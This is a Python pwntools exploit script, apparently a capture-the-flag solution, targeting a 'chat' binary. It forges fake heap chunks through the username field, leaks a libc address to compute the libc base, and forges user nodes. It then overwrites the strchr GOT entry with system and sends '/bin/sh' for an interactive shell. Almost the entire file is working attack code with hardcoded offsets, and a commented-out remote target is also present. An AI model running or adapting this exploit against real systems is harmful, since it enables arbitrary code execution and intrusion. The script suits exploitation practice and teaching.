#!/usr/bin/env python
from pwn import *
context.arch='amd64'
context.log_level='debug'
# p=process('./chat',aslr=0)
p=process('./chat')
# p=remote('139.180.144.86',20005)
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def debugf(payload=''):
    gdb.attach(p,payload)

def enter(room_number):
    sd('enter {}'.format(room_number))

def say(payload):
    sd('say '+payload)

def modify(name):
    sd('modify '+name)
def help():
    sd('help ')

def wait():
    ru('===========================history============================\n')
    ru('==============================================================\n')
def wait1():
    ru('==============================================================\n')
# ==========================================
ru('please enter your name: ')
name=''
username={
    0x0:p64(0),
    0x8:p64(0x21),
    0x28:p64(0x21),
    0x48:p64(0x21),
}
username=fit(username,filler='\x00')
sd(username+' ')             # 0x30 0x20

ru('help\n==========================================\n')
# enter('a'*0x100)
enter('a'*0x50)            # 0x30 --> 0x60     room
wait()
say(p64(0xffffffffffde4770)+p64(0))             # 0x40 --> 0x20
wait()
help()
ru('===========================history============================\n')

libc_addr=u64((p.recvline().strip('\n'))[-6:].ljust(8,'\x00'))
libc_base=libc_addr-0x3ec7e3
map_ptr=libc_base+0x608000
username_adr=0x603140

# pause()
ru('==============================================================\n')
# modify('a'*0x100)
from struct import pack,unpack
map_offset=unpack('<Q',pack('<q',0x603268-map_ptr))[0]

say_payload={
    0x8:p64(map_offset),
    0x20:p64(username_adr+0x10)
}

say(fit(say_payload,filler='\xff'))      # fake usr node
wait()

help()
wait()
say(fit(say_payload,filler='\xff'))      # fake usr node
wait()
help()
wait()


modify('a'*100)
wait()

modify('a'*100)
wait()
help()
wait()

modify('a'*100)
wait()


strchr_got=0x603058
system=0x000000000004f440+libc_base
enter(p64(strchr_got))
wait()
help()
wait()
enter(p64(system))
wait()
sl('/bin/sh\x00')
p.interactive()